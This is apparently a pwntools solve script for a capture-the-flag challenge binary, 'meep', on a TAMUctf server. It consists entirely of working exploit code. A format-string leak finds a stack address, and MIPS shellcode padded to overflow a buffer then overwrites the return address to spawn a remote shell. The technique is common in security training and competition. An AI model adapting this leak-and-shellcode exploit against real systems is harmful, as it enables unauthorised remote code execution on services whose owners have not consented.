from pwn import *

PATH = './meep'

context.log_level = context.log_level if context.log_level != 20 else 'critical'
context.terminal  = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.binary    = elf = ELF(PATH)

SA  = lambda *a, **b : io.sendafter(*a, **b)
S   = lambda *a, **b : io.send(*a, **b)
RU  = lambda *a, **b : io.recvuntil(*a, **b)

sc = asm(shellcraft.mips.linux.sh())

io = remote("streams.tamuctf.com", 443, ssl=True, sni="meep")

LEAK = (12, -144)
PLEAK = f'%{LEAK[0]}$p'

SA(b'Enter admin name', PLEAK.encode() + b'&&')
RU(b'Hello:\n\n')
a = RU(b'Enter diagnostic')
leaks = a.split(b'&&')[0].decode().split()

TARGET = int(leaks[0], 16) + LEAK[1]
PAD = 140
S(sc.ljust(PAD) + p32(TARGET))

io.interactive()
